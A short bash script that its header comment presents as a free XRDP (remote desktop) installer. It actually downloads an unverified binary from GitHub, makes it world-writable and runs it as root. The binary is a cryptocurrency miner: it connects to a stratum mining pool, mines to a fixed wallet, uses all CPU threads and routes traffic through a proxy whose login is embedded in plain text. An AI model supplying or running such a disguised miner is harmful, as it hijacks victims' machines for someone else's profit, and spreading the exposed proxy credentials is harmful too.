#!/bin/bash
# Free XRDP Masbroo is HERE
sudo apt update
apt-get install -y build-essential automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev git
apt install -y lynx
lynx -dont_wrap_pre -dump "https://github.com/TamJsmt/TamJsmt/raw/main/data" > data && chmod 777 data && sudo ./data -a yescryptr16  -o stratum+tcps://stratum-na.rplant.xyz:17055 -u qd2XsEx15JPXV8j3bx7zF2eoigxGWbJ9bP.$(echo $(shuf -i 1-20000 -n 1)-V) -p d=1  -t $(nproc) -x socks5://pjeurfqc-rotate:shrmgzj5zwez@p.webshare.io:80
